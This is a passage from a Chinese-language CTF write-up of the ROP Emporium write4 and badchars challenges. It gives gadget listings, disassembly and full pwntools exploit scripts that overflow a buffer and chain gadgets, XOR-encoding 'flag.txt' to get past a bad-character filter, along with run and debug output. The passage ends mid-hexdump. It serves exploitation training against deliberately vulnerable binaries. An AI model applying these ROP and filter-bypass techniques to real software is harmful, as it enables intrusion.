pop &#123;r0, pc&#125;</span><br><span class=\"line\">0x00010474 : pop &#123;r3, pc&#125;</span><br><span class=\"line\">0x000105f0 : pop &#123;r3, r4, pc&#125;</span><br><span class=\"line\">0x000105f0 : pop &#123;r3, r4, pc&#125; ; pop &#123;r0, pc&#125;</span><br><span class=\"line\">0x000105ac : pop &#123;r4, pc&#125;</span><br><span class=\"line\">0x0001064c : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 10</span><br></pre></td></tr></table></figure>\r\n<p>可以利用<code>0x000105c8</code>处指令将 <em>r3</em> 的值复制给 <em>r0</em> 寄存器，然后将print_file地址弹出到 <em>pc</em> 寄存器中，其中 <em>r3</em> 寄存器值可利用<code>0x000105F0</code>处 <strong>pop</strong> 指令写入data地址。</p>\r\n<p>查看data段地址和print_file函数地址：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.data:00021024 00 00 00 00                   __data_start ALIGN 8                    ; Alternative name is &#x27;__data_start&#x27;</span><br><span class=\"line\">.data:00021024     ; data_start</span><br><span class=\"line\"></span><br><span class=\"line\">.plt:000104B0                               print_file                              ; CODE XREF: usefulFunction+C↓p</span><br><span class=\"line\">.plt:000104B0 00 C6 8F E2                   ADR     R12, 0x104B8</span><br><span class=\"line\">.plt:000104B4 10 CA 8C E2                   ADD     R12, R12, #0x10000</span><br><span class=\"line\">.plt:000104B8 60 FB BC E5                   LDR     PC, [R12,#(print_file_ptr - 0x204B8)]! ; __imp_print_file</span><br></pre></td></tr></table></figure>\r\n<p>编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;arm&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">pop_r3_r4_pc = <span class=\"number\">0x000105F0</span></span><br><span class=\"line\">str_r3_r4 = <span class=\"number\">0x000105EC</span></span><br><span class=\"line\">data_addr = <span class=\"number\">0x00021024</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x000104B0</span></span><br><span class=\"line\">mov_r0_r3 = <span class=\"number\">0x000105C8</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-arm&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class=\"string\">&#x27;./write4_armv5&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(pop_r3_r4_pc)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;flag&quot;</span></span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\">payload += p32(str_r3_r4)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;.txt&quot;</span></span><br><span class=\"line\">payload += p32(data_addr+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(str_r3_r4)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">payload += p32(mov_r0_r3)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC&quot;</span></span><br><span class=\"line\">payload += p32(print_file)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>exp运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span>: pid 17502</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">write4 by ROP Emporium</span><br><span class=\"line\">ARMv5</span><br><span class=\"line\"></span><br><span class=\"line\">Go ahead and give me the input already!</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"mipsel-3\">mipsel</h3>\r\n<p>这里仅给出exp，不想解释了</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;mips&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-mipsel&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class=\"string\">&#x27;./write4_mipsel&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">.text:00400930                               usefulGadgets:</span></span><br><span class=\"line\"><span class=\"string\">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400940 09 F8 20 03                   jalr    $t9</span></span><br><span class=\"line\"><span class=\"string\">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span></span><br><span class=\"line\"><span class=\"string\">.text:00400944</span></span><br><span class=\"line\"><span class=\"string\">.text:00400948 08 00 A4 8F                   lw      $a0, 8($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:0040094C 04 00 B9 8F                   lw      $t9, 4($sp)</span></span><br><span class=\"line\"><span class=\"string\">.text:00400950 09 F8 20 03                   jalr    $t9</span></span><br><span class=\"line\"><span class=\"string\">.text:00400954 00 00 00 00                   nop</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">lw_t0_t1_t9_sw_t1_t0 = <span class=\"number\">0x00400930</span> </span><br><span class=\"line\">exit_addr = <span class=\"number\">0x00400D40</span></span><br><span class=\"line\">lw_t9_a0 = <span class=\"number\">0x00400948</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x00400A90</span></span><br><span class=\"line\">data_addr = <span class=\"number\">0x00411000</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(lw_t0_t1_t9_sw_t1_t0)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBBflag&quot;</span></span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\">payload += p32(lw_t0_t1_t9_sw_t1_t0)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC.txt&quot;</span></span><br><span class=\"line\">payload += p32(data_addr+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(lw_t9_a0)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;DDDD&quot;</span></span><br><span class=\"line\">payload += p32(print_file)</span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"badchars\">badchars</h2>\r\n<p>与write4的不同之处在于写入的字符会被过滤，因此需要先对待写入字符进行编码，写入后运行gadget解码，然后再调用<code>print_file</code>函数。</p>\r\n<h3 id=\"x86-4\">x86</h3>\r\n<p>将libbadchars32.so拖入IDA中分析，发现关键函数如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v1; <span class=\"comment\">// [esp+0h] [ebp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [esp+4h] [ebp-34h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> j; <span class=\"comment\">// [esp+8h] [ebp-30h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v4[<span class=\"number\">36</span>]; <span class=\"comment\">// [esp+10h] [ebp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;x86\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v4, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  v1 = read(<span class=\"number\">0</span>, v4, <span class=\"number\">0x200</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v1; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">3</span>; ++j )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v4[i] == badcharacters[j] )</span><br><span class=\"line\">        v4[i] = <span class=\"number\">-21</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>可以看到第14行的read函数存在溢出，但pwnme函数后面又对写入的字符串进行了过滤，若输入的字符中包含有<code>x</code>、<code>g</code>、<code>a</code>、<code>.</code>四种字符，则会将字符修改为<code>-21(0xEB)</code>，因此不能直接写入flag.txt字符串，需要将字符串进行编码，接下来利用gadget将字符串进行解码，然后将解码后的字符串写入data段，最后将data段地址写入到prinf_file的参数中。</p>\r\n<p>首先搜索相关可利用的gadget：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary badchars32 --only <span class=\"string\">&quot;mov|xor|pop|ret&quot;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x080484e7 : mov al, byte ptr [0xc9010804] ; ret</span><br><span class=\"line\">0x0804854f : mov dword ptr [edi], esi ; ret</span><br><span class=\"line\">0x08048381 : mov ebx, 0x81000000 ; ret</span><br><span class=\"line\">0x08048423 : mov ebx, dword ptr [esp] ; ret</span><br><span class=\"line\">0x080485bb : pop ebp ; ret</span><br><span class=\"line\">0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0804839d : pop ebx ; ret</span><br><span class=\"line\">0x080485ba : pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x080485b9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x08048386 : ret</span><br><span class=\"line\">0x0804849e : ret 0xeac1</span><br><span class=\"line\">0x08048547 : xor byte ptr [ebp], bl ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 12</span><br></pre></td></tr></table></figure>\r\n<p>可以看到存在xor指令，可以进行解码，因此在写入的字符首先需要使用xor进行编码；同时在<code>0x0804854f</code>处存在mov指令，可以将寄存器内容写入内存，因此可以使用esi寄存器存储字符，edi寄存器存储data段地址。至此，rop整体流程如下：</p>\r\n<ol type=\"1\">\r\n<li>使用<code>0x080485b89</code>处的三个pop指令，分别将编码字符，data段地址、data段地址写入esi、edi、ebp寄存器；</li>\r\n<li>调用<code>0x0804854f</code>处的mov指令将编码字符写入data段地址；</li>\r\n<li>重复步骤1-2，将data段地址增加4字节；</li>\r\n<li>调用<code>0x0804839d</code>处pop指令，将解码字符写入ebx寄存器；</li>\r\n<li>调用<code>0x080485bb</code>处pop指令，将data段地址写入ebp寄存器；</li>\r\n<li>调用<code>0x08048547</code>处xor指令，将data段中编码字符进行异或解码；</li>\r\n<li>重复步骤5-6共7次，每次递增data段地址。</li>\r\n</ol>\r\n<p>接下来计算如何对字符进行编码：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">255</span>):</span><br><span class=\"line\">    f = <span class=\"literal\">True</span></span><br><span class=\"line\">    flagtxt: <span class=\"built_in\">str</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"string\">b&quot;flag.txt&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">chr</span>(i ^ j) <span class=\"keyword\">in</span> <span class=\"string\">&#x27;xga.&#x27;</span>:</span><br><span class=\"line\">            f = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flagtxt += <span class=\"built_in\">chr</span>(i ^ j)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> f:</span><br><span class=\"line\">        bl = i</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">flagtxt = flagtxt.encode()</span><br></pre></td></tr></table></figure>\r\n<p>最终编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./badchars32&#x27;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">255</span>):</span><br><span class=\"line\">    f = <span class=\"literal\">True</span></span><br><span class=\"line\">    flagtxt: <span class=\"built_in\">str</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"string\">b&quot;flag.txt&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i ^ j <span class=\"keyword\">in</span> [<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;x&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;g&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;.&#x27;</span>)]:</span><br><span class=\"line\">            f = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flagtxt += <span class=\"built_in\">chr</span>(i ^ j)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> f:</span><br><span class=\"line\">        bl = i</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">flagtxt = flagtxt.encode()   </span><br><span class=\"line\"><span class=\"built_in\">print</span>(flagtxt, bl)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x28</span>+<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">xor_bp_bl = <span class=\"number\">0x08048547</span></span><br><span class=\"line\">pop_bp = <span class=\"number\">0x080485bb</span> </span><br><span class=\"line\">pop_bl = <span class=\"number\">0x0804839d</span></span><br><span class=\"line\">mov_edi_esi = <span class=\"number\">0x0804854f</span></span><br><span class=\"line\">pop_esi_edi_ebp = <span class=\"number\">0x080485b9</span></span><br><span class=\"line\">data_addr = <span class=\"number\">0x0804A018</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x080483D0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(pop_esi_edi_ebp)</span><br><span class=\"line\">payload += flagtxt[<span class=\"number\">0</span>:<span class=\"number\">4</span>]</span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;AAAA&quot;</span></span><br><span class=\"line\">payload += p32(mov_edi_esi)</span><br><span class=\"line\">payload += p32(pop_esi_edi_ebp)</span><br><span class=\"line\">payload += flagtxt[<span class=\"number\">4</span>:<span class=\"number\">8</span>]</span><br><span class=\"line\">payload += p32(data_addr+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">payload += p32(mov_edi_esi)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(pop_bl)</span><br><span class=\"line\">payload += p32(bl)</span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    payload += p32(pop_bp)</span><br><span class=\"line\">    payload += p32(data_addr + j)</span><br><span class=\"line\">    payload += p32(xor_bp_bl)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(print_file)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC&quot;</span></span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">b&quot;&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;./badchars32&#x27;</span>: pid 7504</span><br><span class=\"line\">b<span class=\"string\">&#x27;dnce,vzv&#x27;</span> 2</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"x64-4\">x64</h3>\r\n<p>与32位程序类似，可以将编码字符一次性写入data段内，但仍需逐个解码。</p>\r\n<p>使用ROPgadget查看可利用片段：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary badchars --only <span class=\"string\">&quot;mov|xor|pop|ret&quot;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000400635 : mov dword ptr [rbp], esp ; ret</span><br><span class=\"line\">0x0000000000400610 : mov eax, 0 ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000400634 : mov qword ptr [r13], r12 ; ret</span><br><span class=\"line\">0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004006a0 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004006a2 : pop r15 ; ret</span><br><span class=\"line\">0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400588 : pop rbp ; ret</span><br><span class=\"line\">0x00000000004006a3 : pop rdi ; ret</span><br><span class=\"line\">0x00000000004006a1 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004004ee : ret</span><br><span class=\"line\">0x0000000000400293 : ret 0xb2ec</span><br><span class=\"line\">0x0000000000400628 : xor byte ptr [r15], r14b ; ret</span><br><span class=\"line\">0x0000000000400629 : xor byte ptr [rdi], dh ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 18</span><br></pre></td></tr></table></figure>\r\n<p>可以利用<code>0x0000000000400634、0x000000000040069c、0x00000000004006a3、0x0000000000400628</code>四处指令完成，查看data段地址与print_file函数地址，分别为<code>0x0000000000601028</code>和<code>0x0000000000400510</code>，编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./badchars&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_r12_r13_r14_r15 = <span class=\"number\">0x40069c</span></span><br><span class=\"line\">pop_r15 = <span class=\"number\">0x4006a2</span></span><br><span class=\"line\">xor_r15_r14 = <span class=\"number\">0x0400628</span></span><br><span class=\"line\">mov_r13_r12 = <span class=\"number\">0x0400634</span></span><br><span class=\"line\">data_addr = <span class=\"number\">0x0601028</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x400510</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x4006a3</span> </span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x20</span> + <span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">255</span>):</span><br><span class=\"line\">    f = <span class=\"literal\">True</span></span><br><span class=\"line\">    flagtxt: <span class=\"built_in\">str</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"string\">b&quot;flag.txt&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i ^ j <span class=\"keyword\">in</span> [<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;x&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;g&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;.&#x27;</span>)]:</span><br><span class=\"line\">            f = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flagtxt += <span class=\"built_in\">chr</span>(i ^ j)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> f:</span><br><span class=\"line\">        bl = i</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">flagtxt = flagtxt.encode()   </span><br><span class=\"line\"><span class=\"built_in\">print</span>(flagtxt, bl)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p64(pop_r12_r13_r14_r15)</span><br><span class=\"line\">payload += flagtxt</span><br><span class=\"line\">payload += p64(data_addr)</span><br><span class=\"line\">payload += p64(bl)</span><br><span class=\"line\">payload += p64(data_addr)</span><br><span class=\"line\">payload += p64(mov_r13_r12)</span><br><span class=\"line\">payload += p64(xor_r15_r14)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    payload += p64(pop_r15)</span><br><span class=\"line\">    payload += p64(data_addr+i+<span class=\"number\">1</span>)</span><br><span class=\"line\">    payload += p64(xor_r15_r14)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p64(pop_rdi)</span><br><span class=\"line\">payload += p64(data_addr)</span><br><span class=\"line\">payload += p64(print_file)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">b&quot;&gt; &quot;</span>, payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>但是从下面的运行结果中发现存在错误，无法得到flag。</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;./badchars&#x27;</span>: pid 7609</span><br><span class=\"line\">b<span class=\"string\">&#x27;dnce,vzv&#x27;</span> 2</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">[*] Process <span class=\"string\">&#x27;./badchars&#x27;</span> stopped with <span class=\"built_in\">exit</span> code 1 (pid 7609)</span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">Failed to open file: flag.tzt</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<p>从结果中发现文件名本应该是<code>flag.txt</code>，但运行时变成了<code>flag.tzt</code>，于是进行debug，查看详细记录。</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;./badchars&#x27;</span> argv=[b<span class=\"string\">&#x27;./badchars&#x27;</span>] : pid 7648</span><br><span class=\"line\">b<span class=\"string\">&#x27;dnce,vzv&#x27;</span> 2</span><br><span class=\"line\">[DEBUG] Received 0x44 bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;badchars by ROP Emporium\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;x86_64\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;\\n&quot;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;&gt; &#x27;</span></span><br><span class=\"line\">[DEBUG] Sent 0x120 bytes:</span><br><span class=\"line\">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class=\"line\">    *</span><br><span class=\"line\">    00000020  41 41 41 41  41 41 41 41  9c 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│</span><br><span class=\"line\">    00000030  64 6e 63 65  2c 76 7a 76  28 10 60 00  00 00 00 00  │dnce│,vzv│(·`·│····│</span><br><span class=\"line\">    00000040  02 00 00 00  00 00 00 00  28 10 60 00  00 00 00 00  │····│····│(·`·│····│</span><br><span class=\"line\">    00000050  34 06 40 00  00 00 00 00  28 06 40 00  00 00 00 00  │4·@·│····│(·@·│····│</span><br><span class=\"line\">    00000060  a2 06 40 00  00 00 00 00  29 10 60 00  00 00 00 00  │··@·│····│)·`·│····│</span><br><span class=\"line\">    00000070  28 06 40 00  00 00 00 00  a2 06 40 00  00 00 00 00  │(·@·│····│··@·│····│</span><br><span class=\"line\">    00000080  2a 10 60 00  00 00 00 00  28 06 40 00  00 00 00 00  │*·`·│····│(·@·│····│</span><br><span class=\"line\">    00000090  a2 06 40 00  00 00 00 00  2b 10 60 00  00 00 00 00  │··@·│····│+·`·│····│</span><br><span class=\"line\">    000000a0  28 06 40 00  00 00 00 00  a2 06 40 00  00 00 00 00  │(·@·│····│··@·│····│</span><br><span class=\"line\">    000000b0  2c 10 60 00  00 00 00 00  28 06 40 00  00 00 00 00  │,·`·│····│(·@·│····│</span><br><span class=\"line\">    000000c0  a2 06 40 00  00 00 00 00  2d 10 60 00  00 00 00 00  │··@·│····│-·`·│····│</span><br><span class=\"line\">    000000d0  28 06 40 00  00 00 00 00  a2 06 40 00  00 00 00 00  │(·@·│····│··@·│····│</span><br><span class=\"line\">    000000e0  2e 10 60 00  00 00 00 00  28 06 40 00  00 00 00 00  │.·`·│····│(·@·│····│</span><br><span class=\"line\">    000000f0  a2 06 40 00  00 00 00 00  2f 10 60 00  00 00 00 00  │··@·│····│/·`·│····│</span><br><span class=\"line\">    00000100  28 06 40 00  00 00 00 00  a3 06 40 